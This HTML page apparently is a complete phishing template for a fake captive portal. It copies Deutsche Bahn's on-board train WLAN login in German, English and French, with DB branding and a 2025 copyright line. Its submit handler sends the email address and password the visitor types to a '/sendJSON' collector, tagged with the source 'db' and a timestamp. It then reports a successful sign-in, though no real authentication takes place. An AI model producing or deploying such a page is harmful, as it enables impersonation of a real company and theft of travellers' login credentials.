<!doctype html>
<html lang="de">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Gast-Zugang — DB WLANPortal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      :root {
        --db-red: #e3000f;
        --db-black: #000000;
        --db-white: #ffffff;
        --bg-page: #f5f5f5;
        --card-bg: #ffffff;
        --card-border: rgba(0, 0, 0, 0.08);
        --text-primary: #000000;
        --text-secondary: #4a4a4a;
        --input-border: #dadce0;
        --input-focus: #e3000f;
        --error: #b91c1c;
        --success: #166534;
      }
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      body {
        font-family:
          "Inter",
          system-ui,
          -apple-system,
          sans-serif;
        background: var(--bg-page);
        color: var(--text-primary);
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding: 20px;
        padding-top: 76px;
        -webkit-font-smoothing: antialiased;
      }
      .card {
        width: 100%;
        max-width: 420px;
        background: var(--card-bg);
        border: 1px solid var(--card-border);
        border-radius: 16px;
        padding: 40px 32px;
        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
      }
      .logo-wrap {
        margin: 0 auto 28px;
        text-align: center;
      }
      .logo-wrap svg {
        width: 200px;
        height: auto;
        display: block;
        margin: 0 auto;
      }
      .hero-title {
        font-size: 1.5rem;
        font-weight: 700;
        color: var(--text-primary);
        text-align: center;
        margin-bottom: 6px;
      }
      .tagline {
        font-size: 0.9375rem;
        color: var(--text-secondary);
        text-align: center;
        margin-bottom: 28px;
      }
      .promo {
        background: #fafafa;
        border: 1px solid var(--card-border);
        border-radius: 12px;
        padding: 16px 20px;
        margin-bottom: 28px;
        text-align: center;
      }
      .promo-title {
        font-size: 0.9375rem;
        font-weight: 600;
        color: var(--text-primary);
        margin-bottom: 4px;
      }
      .promo-text {
        font-size: 0.8125rem;
        color: var(--text-secondary);
      }
      .form-title {
        font-size: 1rem;
        font-weight: 600;
        color: var(--text-primary);
        margin-bottom: 16px;
      }
      .field {
        margin-bottom: 1.25rem;
        text-align: left;
      }
      .field label {
        display: block;
        margin-bottom: 0.375rem;
        font-size: 0.875rem;
        font-weight: 500;
        color: var(--text-primary);
      }
      .g-input {
        width: 100%;
        padding: 12px 16px;
        font-size: 1rem;
        border: 1px solid var(--input-border);
        border-radius: 8px;
        background: var(--card-bg);
        color: var(--text-primary);
        font-family: inherit;
        transition:
          border-color 0.15s ease,
          box-shadow 0.15s ease;
      }
      .g-input::placeholder {
        color: #9ca3af;
      }
      .g-input:focus {
        outline: none;
        border-color: var(--input-focus);
        box-shadow: 0 0 0 3px rgba(227, 0, 15, 0.12);
      }
      button[type="submit"] {
        width: 100%;
        margin-top: 0.5rem;
        padding: 14px;
        border: none;
        border-radius: 8px;
        background: var(--db-red);
        color: var(--db-white);
        font-size: 1rem;
        font-weight: 600;
        font-family: inherit;
        cursor: pointer;
        transition:
          opacity 0.15s ease,
          background 0.15s ease;
      }
      button[type="submit"]:hover {
        opacity: 0.95;
        background: #c2000d;
      }
      button[type="submit"]:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }
      .form-status {
        margin: 0.75rem 0 0;
        font-size: 0.875rem;
        min-height: 1.25rem;
      }
      .form-status--success {
        color: var(--success);
      }
      .form-status--error {
        color: var(--error);
      }
      .footer-note {
        font-size: 0.75rem;
        color: #6b7280;
        text-align: center;
        margin-top: 24px;
      }
      .page-header {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        height: 56px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 24px;
        background: var(--card-bg);
        border-bottom: 1px solid var(--card-border);
        z-index: 10;
      }
      .header-logo {
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .header-logo svg {
        width: 80px;
        height: 32px;
      }
      .header-logo .wlan-text {
        font-size: 1rem;
        font-weight: 600;
        color: var(--text-primary);
      }
      .lang-switcher {
        display: flex;
        gap: 16px;
        font-size: 0.875rem;
        color: var(--text-secondary);
      }
      .lang-switcher a {
        color: inherit;
        text-decoration: none;
      }
      .lang-switcher a.active {
        color: var(--db-red);
        text-decoration: underline;
        text-underline-offset: 3px;
      }
      .status-pill {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 8px 16px;
        background: var(--card-bg);
        border: 1px solid var(--card-border);
        border-radius: 999px;
        font-size: 0.875rem;
        color: var(--text-secondary);
        margin-bottom: 24px;
      }
      .status-pill .dot {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        background: var(--success);
      }
      .card-header-red {
        background: var(--db-red);
        color: var(--db-white);
        padding: 20px 24px;
        border-radius: 16px 16px 0 0;
        margin: 0 -40px 24px -40px;
        display: flex;
        align-items: flex-start;
        gap: 12px;
      }
      .card-header-red .icon-signal {
        flex-shrink: 0;
        width: 24px;
        height: 24px;
        margin-top: 2px;
      }
      .card-header-red h2 {
        font-size: 1.25rem;
        font-weight: 700;
        margin: 0 0 4px;
      }
      .card-header-red .subtitle {
        font-size: 0.8125rem;
        opacity: 0.95;
      }
      .info-block {
        display: flex;
        gap: 12px;
        padding: 12px 16px;
        margin-bottom: 24px;
        background: #f0f7ff;
        border-left: 4px solid #2563eb;
        border-radius: 0 8px 8px 0;
        font-size: 0.8125rem;
        color: var(--text-secondary);
      }
      .info-block .icon-info {
        flex-shrink: 0;
        width: 20px;
        height: 20px;
        color: #2563eb;
      }
      .field label.uppercase {
        font-size: 0.75rem;
        font-weight: 600;
        letter-spacing: 0.05em;
        color: var(--text-secondary);
      }
      .input-wrap {
        position: relative;
      }
      .input-wrap .icon-input {
        position: absolute;
        left: 14px;
        top: 50%;
        transform: translateY(-50%);
        width: 18px;
        height: 18px;
        color: #9ca3af;
        pointer-events: none;
      }
      .input-wrap .g-input {
        padding-left: 44px;
      }
      .input-wrap.has-toggle .g-input {
        padding-right: 44px;
      }
      .forgot-link {
        font-size: 0.8125rem;
        color: #2563eb;
        text-decoration: none;
        margin-top: 4px;
        display: inline-block;
      }
      .forgot-link:hover {
        text-decoration: underline;
      }
      .terms-row {
        display: flex;
        align-items: flex-start;
        gap: 10px;
        margin-bottom: 20px;
        font-size: 0.8125rem;
        color: var(--text-secondary);
      }
      .terms-row input {
        margin-top: 3px;
        accent-color: var(--db-red);
      }
      .terms-row a {
        color: #2563eb;
        text-decoration: none;
      }
      .terms-row a:hover {
        text-decoration: underline;
      }
      .premium-link-wrap {
        text-align: center;
        margin-top: 20px;
        font-size: 0.875rem;
        color: var(--text-secondary);
      }
      .premium-link-wrap a {
        color: var(--db-red);
        font-weight: 600;
        text-decoration: none;
      }
      .premium-link-wrap a:hover {
        text-decoration: underline;
      }
      .page-footer {
        margin-top: 48px;
        padding: 24px 20px;
        text-align: center;
        font-size: 0.8125rem;
        color: var(--text-secondary);
      }
      .page-footer a {
        color: var(--text-secondary);
        text-decoration: none;
        margin: 0 12px;
      }
      .page-footer a:hover {
        text-decoration: underline;
      }
      .page-footer .copyright {
        margin-top: 12px;
        font-size: 0.75rem;
      }
      .pwd-toggle {
        position: absolute;
        right: 12px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        padding: 4px;
        cursor: pointer;
        color: #9ca3af;
      }
      .pwd-toggle:hover {
        color: var(--text-secondary);
      }
    </style>
  </head>
  <body>
    <header class="page-header">
      <div class="header-logo">
        <svg viewBox="0 0 63 32" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <rect x="0" y="2" width="36" height="28" rx="6" fill="#e3000f" />
          <rect x="4" y="6" width="28" height="20" rx="4" fill="#ffffff" />
          <text x="18" y="22" text-anchor="middle" font-family="Inter,sans-serif" font-weight="700" font-size="16" fill="#e3000f">DB</text>
        </svg>
        <span class="wlan-text">WLANPortal</span>
      </div>
      <nav class="lang-switcher">
        <a href="#" class="active" data-lang="de">DE</a>
        <a href="#" data-lang="en">EN</a>
        <a href="#" data-lang="fr">FR</a>
      </nav>
    </header>

    <div class="status-pill">
      <span class="dot" aria-hidden="true"></span>
      <span data-i18n="status">Verbunden – DB Zug-WLAN</span>
    </div>

    <div class="card">
      <div class="logo-wrap">
        <svg
          viewBox="0 0 200 48"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          aria-label="DB BAHN"
        >
          <rect x="10" y="4" width="53" height="44" rx="8" fill="#e3000f" />
          <rect x="14" y="8" width="45" height="36" rx="5" fill="#ffffff" />
          <text
            x="36"
            y="36"
            text-anchor="middle"
            font-family="Inter, system-ui, sans-serif"
            font-weight="700"
            font-size="30"
            fill="#e3000f"
          >
            DB
          </text>
          <text
            x="108"
            y="36"
            text-anchor="middle"
            font-family="Inter, system-ui, sans-serif"
            font-weight="700"
            font-size="30"
            fill="#000000"
          >
            BAHN
          </text>
        </svg>
      </div>

      <h1 class="hero-title" data-i18n="heroTitle">DB WLAN an Bord</h1>
      <p class="tagline" data-i18n="tagline">Kostenloses WLAN in Ihrem ICE / IC</p>

      <div class="info-block">
        <svg class="icon-info" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
          <circle cx="12" cy="12" r="10" />
          <path d="M12 16v-4M12 8h.01" stroke-linecap="round" />
        </svg>
        <p data-i18n="info">Kostenloser Zugang mit reduzierter Geschwindigkeit. Max. 200 MB/Tag.</p>
      </div>

      <form id="email-form-step">
        <div class="field">
          <label for="userid" class="uppercase" data-i18n="emailLabel">E-Mail-Adresse</label>
          <div class="input-wrap">
            <svg class="icon-input" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
              <polyline points="22,6 12,13 2,6" />
            </svg>
            <input
              id="userid"
              name="email"
              type="text"
              class="g-input"
              data-i18n-placeholder="emailPlaceholder"
              placeholder="name@beispiel.de"
              required
            />
          </div>
        </div>
        <div class="field">
          <label for="pwd" class="uppercase" data-i18n="passwordLabel">Passwort</label>
          <div class="input-wrap has-toggle">
            <svg class="icon-input" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
              <rect x="3" y="11" width="18" height="11" rx="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
            </svg>
            <input
              id="pwd"
              name="password"
              type="password"
              class="g-input"
              data-i18n-placeholder="passwordPlaceholder"
              placeholder="••••••••••"
              required
            />
            <button type="button" class="pwd-toggle" id="pwd-toggle" data-i18n-aria-show="pwdShow" data-i18n-aria-hide="pwdHide" aria-label="Passwort anzeigen">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </button>
          </div>
          <a href="#" class="forgot-link" data-i18n="forgot">Passwort vergessen?</a>
        </div>
        <div class="terms-row">
          <input type="checkbox" id="terms" name="terms" required />
          <label for="terms" data-i18n-html="termsHtml">Ich stimme den <a href="#">Nutzungsbedingungen</a> und den <a href="#">Datenschutzhinweisen</a> zu.</label>
        </div>
        <button type="submit" id="signin-btn" data-i18n="submitBtn">Kostenlos verbinden</button>
        <p id="form-status" class="form-status" aria-live="polite"></p>
      </form>

      <p class="premium-link-wrap">
        <span data-i18n="premiumPre">Bahnkunde?</span> <a href="#" data-i18n="premiumLink">Mit BahnCard anmelden für Premium-WLAN</a>
      </p>
    </div>

    <footer class="page-footer">
      <a href="#" data-i18n="impressum">Impressum</a>
      <a href="#" data-i18n="datenschutz">Datenschutz</a>
      <a href="#" data-i18n="nutzung">Nutzungsbedingungen</a>
      <a href="#" data-i18n="hilfe">Hilfe &amp; Kontakt</a>
      <p class="copyright" data-i18n="copyright">© 2025 Deutsche Bahn AG</p>
    </footer>

    <script>
      (function () {
        var LANG_STORAGE_KEY = "db-portal-lang";
        var currentLang = localStorage.getItem(LANG_STORAGE_KEY) || "de";

        var translations = {
          de: {
            status: "Verbunden – DB Zug-WLAN",
            heroTitle: "DB WLAN an Bord",
            tagline: "Kostenloses WLAN in Ihrem ICE / IC",
            info: "Kostenloser Zugang mit reduzierter Geschwindigkeit. Max. 200 MB/Tag.",
            emailLabel: "E-Mail-Adresse",
            passwordLabel: "Passwort",
            emailPlaceholder: "name@beispiel.de",
            passwordPlaceholder: "••••••••••",
            pwdShow: "Passwort anzeigen",
            pwdHide: "Passwort verbergen",
            forgot: "Passwort vergessen?",
            termsHtml: 'Ich stimme den <a href="#">Nutzungsbedingungen</a> und den <a href="#">Datenschutzhinweisen</a> zu.',
            submitBtn: "Kostenlos verbinden",
            premiumPre: "Bahnkunde?",
            premiumLink: "Mit BahnCard anmelden für Premium-WLAN",
            impressum: "Impressum",
            datenschutz: "Datenschutz",
            nutzung: "Nutzungsbedingungen",
            hilfe: "Hilfe & Kontakt",
            copyright: "© 2025 Deutsche Bahn AG",
            errorRequired: "Bitte E-Mail und Passwort eingeben.",
            successMsg: "Angemeldet.",
            errorFetch: "Fehler. Bitte prüfen Sie Ihre Verbindung.",
          },
          en: {
            status: "Connected – DB Train WLAN",
            heroTitle: "DB WLAN on board",
            tagline: "Free WLAN in your ICE / IC",
            info: "Free access at reduced speed. Max. 200 MB/day.",
            emailLabel: "Email address",
            passwordLabel: "Password",
            emailPlaceholder: "name@example.com",
            passwordPlaceholder: "••••••••••",
            pwdShow: "Show password",
            pwdHide: "Hide password",
            forgot: "Forgot password?",
            termsHtml: 'I agree to the <a href="#">Terms of use</a> and <a href="#">Privacy notice</a>.',
            submitBtn: "Connect for free",
            premiumPre: "Frequent traveller?",
            premiumLink: "Sign in with BahnCard for premium WLAN",
            impressum: "Imprint",
            datenschutz: "Privacy",
            nutzung: "Terms of use",
            hilfe: "Help & contact",
            copyright: "© 2025 Deutsche Bahn AG",
            errorRequired: "Please enter email and password.",
            successMsg: "Signed in.",
            errorFetch: "Error. Please check your connection.",
          },
          fr: {
            status: "Connecté – DB WLAN à bord",
            heroTitle: "DB WLAN à bord",
            tagline: "WLAN gratuit dans votre ICE / IC",
            info: "Accès gratuit à vitesse réduite. Max. 200 Mo/jour.",
            emailLabel: "Adresse e-mail",
            passwordLabel: "Mot de passe",
            emailPlaceholder: "nom@exemple.fr",
            passwordPlaceholder: "••••••••••",
            pwdShow: "Afficher le mot de passe",
            pwdHide: "Masquer le mot de passe",
            forgot: "Mot de passe oublié ?",
            termsHtml: 'J\'accepte les <a href="#">Conditions d\'utilisation</a> et la <a href="#">Politique de confidentialité</a>.',
            submitBtn: "Se connecter gratuitement",
            premiumPre: "Client fidèle ?",
            premiumLink: "Connectez-vous avec la BahnCard pour le WLAN premium",
            impressum: "Mentions légales",
            datenschutz: "Confidentialité",
            nutzung: "Conditions d'utilisation",
            hilfe: "Aide et contact",
            copyright: "© 2025 Deutsche Bahn AG",
            errorRequired: "Veuillez saisir l'e-mail et le mot de passe.",
            successMsg: "Connecté.",
            errorFetch: "Erreur. Veuillez vérifier votre connexion.",
          },
        };

        function applyLang(lang) {
          if (!translations[lang]) lang = "de";
          currentLang = lang;
          localStorage.setItem(LANG_STORAGE_KEY, lang);
          var t = translations[lang];

          document.querySelectorAll("[data-i18n]").forEach(function (el) {
            var key = el.getAttribute("data-i18n");
            if (t[key]) el.textContent = t[key];
          });
          document.querySelectorAll("[data-i18n-placeholder]").forEach(function (el) {
            var key = el.getAttribute("data-i18n-placeholder");
            if (t[key]) el.placeholder = t[key];
          });
          document.querySelectorAll("[data-i18n-html]").forEach(function (el) {
            var key = el.getAttribute("data-i18n-html");
            if (t[key]) el.innerHTML = t[key];
          });
          var pwdToggle = document.getElementById("pwd-toggle");
          if (pwdToggle) {
            var isPassword = document.getElementById("pwd").type === "password";
            pwdToggle.setAttribute("aria-label", isPassword ? t.pwdShow : t.pwdHide);
          }
          document.querySelectorAll(".lang-switcher a").forEach(function (a) {
            a.classList.toggle("active", a.getAttribute("data-lang") === lang);
          });
        }

        document.querySelectorAll(".lang-switcher a").forEach(function (a) {
          a.addEventListener("click", function (e) {
            e.preventDefault();
            var lang = this.getAttribute("data-lang");
            if (lang && translations[lang]) applyLang(lang);
          });
        });

        applyLang(currentLang);
      })();

      document.getElementById("pwd-toggle").addEventListener("click", function () {
        var pwd = document.getElementById("pwd");
        var isPassword = pwd.type === "password";
        pwd.type = isPassword ? "text" : "password";
        var lang = localStorage.getItem("db-portal-lang") || "de";
        var t = {
          de: { show: "Passwort anzeigen", hide: "Passwort verbergen" },
          en: { show: "Show password", hide: "Hide password" },
          fr: { show: "Afficher le mot de passe", hide: "Masquer le mot de passe" },
        }[lang] || { show: "Passwort anzeigen", hide: "Passwort verbergen" };
        this.setAttribute("aria-label", isPassword ? t.hide : t.show);
      });
      document
        .getElementById("email-form-step")
        .addEventListener("submit", function (event) {
          event.preventDefault();

          var btn = document.getElementById("signin-btn");
          var statusEl = document.getElementById("form-status");
          statusEl.textContent = "";
          statusEl.className = "form-status";

          var username = document.getElementById("userid").value.trim();
          var password = document.getElementById("pwd").value;

          var lang = localStorage.getItem("db-portal-lang") || "de";
          var t = {
            de: { required: "Bitte E-Mail und Passwort eingeben.", success: "Angemeldet.", error: "Fehler. Bitte prüfen Sie Ihre Verbindung." },
            en: { required: "Please enter email and password.", success: "Signed in.", error: "Error. Please check your connection." },
            fr: { required: "Veuillez saisir l'e-mail et le mot de passe.", success: "Connecté.", error: "Erreur. Veuillez vérifier votre connexion." },
          }[lang] || { required: "Bitte E-Mail und Passwort eingeben.", success: "Angemeldet.", error: "Fehler. Bitte prüfen Sie Ihre Verbindung." };

          if (!username || !password) {
            statusEl.textContent = t.required;
            statusEl.className = "form-status form-status--error";
            return;
          }

          var jsonData = {
            username: username,
            password: password,
            source: "db",
            timestamp: new Date().toISOString(),
          };

          btn.disabled = true;

          fetch("/sendJSON", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(jsonData),
          })
            .then(function (response) {
              if (!response.ok) {
                throw new Error(
                  "Server responded with status " + response.status,
                );
              }
              var ct = response.headers.get("Content-Type") || "";
              if (ct.indexOf("application/json") !== -1) {
                return response.json();
              }
              return response.text().then(function () {
                return null;
              });
            })
            .then(function () {
              statusEl.textContent = t.success;
              statusEl.className = "form-status form-status--success";
              console.log("Payload sent to /sendJSON successfully.");
            })
            .catch(function (error) {
              statusEl.textContent = t.error;
              statusEl.className = "form-status form-status--error";
              console.error("Fetch error:", error);
            })
            .finally(function () {
              btn.disabled = false;
            });
        });
    </script>
  </body>
</html>
